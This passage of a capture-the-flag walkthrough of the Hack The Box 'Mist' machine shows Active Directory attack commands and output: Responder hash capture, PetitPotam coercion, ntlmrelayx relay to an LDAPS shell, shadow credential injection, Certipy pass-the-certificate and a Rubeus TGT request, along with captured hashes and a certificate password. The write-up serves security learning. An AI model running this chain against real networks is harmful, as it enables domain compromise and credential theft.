ncacn_np:192.168.100.101[\PIPE\lsarpc]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe samr</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\samr]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe netlogon</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\netlogon]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe lsass</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsass]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo responder -I tun0 -v</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [OFF]</span><br><span class="line">    Auth proxy                 [OFF]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line">    MQTT server                [ON]</span><br><span class="line">    RDP server                 [ON]</span><br><span class="line">    DCE-RPC server             [ON]</span><br><span class="line">    WinRM server               [ON]</span><br><span class="line">    SNMP server                [OFF]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [OFF]</span><br><span class="line">    Force ESS downgrade        [OFF]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.x.x]</span><br><span class="line">    Responder IPv6             [dead:beef:4::1005]</span><br><span class="line">    Challenge <span class="built_in">set</span>              [random]</span><br><span class="line">    Don<span class="string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="string">&#x27;, &#x27;</span>ISATAP.LOCAL<span class="string">&#x27;]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Current Session Variables:</span></span><br><span class="line"><span class="string">    Responder Machine Name     [WIN-4VFBEQUM2XP]</span></span><br><span class="line"><span class="string">    Responder Domain Name      [QIJ9.LOCAL]</span></span><br><span class="line"><span class="string">    Responder DCE-RPC Port     [47421]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Listening for events...                                                                             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Client   : 10.129.128.221</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Username : MIST\MS01$</span></span><br><span class="line"><span class="string">[SMB] NTLMv2-SSP Hash     : MS01$::MIST:b7d9b4286a477169:8D35B82B5E42AA5DC34CFBDAC828BADA:01010000000000000044489DFA26DB012DBA172017E8D32D0000000002000800510049004A00390001001E00570049004E002D0034005600460042004500510055004D0032005800500004003400570049004E002D0034005600460042004500510055004D003200580050002E00510049004A0039002E004C004F00430041004C0003001400510049004A0039002E004C004F00430041004C0005001400510049004A0039002E004C004F00430041004C00070008000044489DFA26DB01060004000200000008003000300000000000000000000000004000006D4270F1B6F11653A80041CB7179F07AF54BC5E8DCEF75AB9D15C78A9F899C870A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0037000000000000000000 </span></span><br></pre></td></tr></table></figure></div>

<p>And we get a hit! So now let’s use ntlmrelayx script from <a class="link"   target="_blank" rel="noopener" href="https://github.com/fortra/impacket" >Impacket <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> to get the LDAP shell, clear the shadow credentials and later add the new one (we can do that using this specific pull request <a class="link"   target="_blank" rel="noopener" href="https://github.com/fortra/impacket/pull/1402" >https://github.com/fortra/impacket/pull/1402 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>):</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/mist/PetitPotam]</span><br><span class="line">└─$ proxychains python3 PetitPotam.py -u <span class="string">&#x27;brandon.keywarp&#x27;</span> -hashes :DB03D6A77A2205BC1D07082740626CC9 -pipe all MS01@6666/aaa 192.168.100.101</span><br><span class="line"></span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line"></span><br><span class="line">                                                                                               </span><br><span class="line">              ___            _        _      _        ___            _                     </span><br><span class="line">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   </span><br><span class="line">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | <span class="string">&#x27;  \  </span></span><br><span class="line"><span class="string">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span></span><br><span class="line"><span class="string">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span></span><br><span class="line"><span class="string">          &quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span> </span><br><span class="line">                                         </span><br><span class="line">              PoC to elicit machine account authentication via some MS-EFSRPC <span class="built_in">functions</span></span><br><span class="line">                                      by topotam (@topotam77)</span><br><span class="line">      </span><br><span class="line">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying pipe efsr</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">Something went wrong, check error status =&gt; SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.</span><br><span class="line">Trying pipe lsarpc</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe samr</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\samr]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe netlogon</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\netlogon]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br><span class="line">Trying pipe lsass</span><br><span class="line">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsass]</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span><br><span class="line">[+] Connected!</span><br><span class="line">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending EfsRpcOpenFileRaw!</span><br><span class="line">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span><br><span class="line">[+] OK! Using unpatched <span class="keyword">function</span>!</span><br><span class="line">[-] Sending EfsRpcEncryptFileSrv!</span><br><span class="line">[+] Got expected ERROR_BAD_NETPATH exception!!</span><br><span class="line">[+] Attack worked!</span><br></pre></td></tr></table></figure></div>
<p>Then run ntlmrelayx:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ proxychains python3 /usr/local/bin/ntlmrelayx.py -debug -t ldaps://192.168.100.100  -i -smb2support  -domain mist.htb</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">/usr/local/bin/ntlmrelayx.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1+20220912.224808.5fcd5e81&#x27;</span>, <span class="string">&#x27;ntlmrelayx.py&#x27;</span>)</span><br><span class="line">Impacket v0.10.1.dev1+20220912.224808.5fcd5e81 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket-0.10.1.dev1+20220912.224808.5fcd5e81-py3.11.egg/impacket</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Setting up RAW Server on port 6666</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">[*] HTTPD(80): Connection from 10.129.166.107 controlled, attacking target ldaps://192.168.100.100</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:636  ...  OK</span><br><span class="line">[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED</span><br><span class="line">[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000</span><br><span class="line">[+] No more targets</span><br><span class="line">[*] HTTPD(80): Connection from 10.129.166.107 controlled, but there are no more targets left!</span><br></pre></td></tr></table></figure></div>

<p>One really important thing is do not forget to keep running <code>.\DavRelayUp.exe relay -l http://*:5357/ --ComputerName ms01$ -f -m shadowcred --domain mist.htb</code>.</p>
<p>And now we can connect to our shell:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ nc 127.0.0.1 11000</span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear_shadow_creds MS01$</span></span><br><span class="line">Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb</span><br><span class="line">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108</span><br><span class="line"></span><br><span class="line">Shadow credentials cleared successfully!</span><br><span class="line"></span><br><span class="line"><span class="comment"># set_shadow_creds MS01$</span></span><br><span class="line">Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb</span><br><span class="line">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108</span><br><span class="line"></span><br><span class="line">KeyCredential generated with DeviceID: a7a6bf2a-0197-0a69-a2f0-69702c52ccef</span><br><span class="line">Shadow credentials successfully added!</span><br><span class="line">Saved PFX (<span class="comment">#PKCS12) certificate &amp; key at path: 9xpGRCU8.pfx</span></span><br><span class="line">Must be used with password: 2zFj7mulRkxeaECxp6n5</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h4 id="Pass-the-Certificate"><a href="#Pass-the-Certificate" class="headerlink" title="Pass the Certificate"></a>Pass the Certificate</h4><p>I’ll now remove password protection from the 9xpGRCU8.pfx certificate and saves it as unprotected.pfx.</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket]</span><br><span class="line">└─$ certipy-ad cert -<span class="built_in">export</span> -pfx  9xpGRCU8.pfx -password 2zFj7mulRkxeaECxp6n5 -out unrpotected.pfx</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Writing PFX to <span class="string">&#x27;unrpotected.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>And now uthenticate to the mist.htb domain as MS01$ using the unprotected.pfx certificate acquiring its’ hash:</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/impacket]</span><br><span class="line">└─$ proxychains certipy-ad auth -pfx unrpotected.pfx -domain mist.htb -username MS01$ -dc-ip 192.168.100.100 -ns 192.168.100.100</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[!] Could not find identification <span class="keyword">in</span> the provided certificate</span><br><span class="line">[*] Using principal: ms01<span class="variable">$@mist</span>.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;ms01.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ms01$&#x27;</span></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.100:88  ...  OK</span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;ms01$@mist.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:57e09da59439ab2d04c15e9250237f48</span><br></pre></td></tr></table></figure></div>


<p>Now I’ll request a TGT for the ms01$ account using an RC4 hash for authentication:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\xampp\htdocs\files&gt; ./RUbeus.exe asktgt /nowrap /user:<span class="string">&quot;ms01<span class="variable">$</span>&quot;</span> /rc4:<span class="number">57</span>e09da59439ab2d04c15e9250237f48</span><br><span class="line">./RUbeus.exe asktgt /nowrap /user:<span class="string">&quot;ms01<span class="variable">$</span>&quot;</span> /rc4:<span class="number">57</span>e09da59439ab2d04c15e9250237f48</span><br><span class="line"></span><br><span class="line">   ______        _                      </span><br><span class="line">  (_____ \      | |                     </span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___ </span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">2.1</span> </span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> rc4_hmac hash: 57e09da59439ab2d04c15e9250237f48</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ preauth) <span class="keyword">for</span>: <span class="string">&#x27;mist.htb\ms01$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 192.168.100.100:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/<span 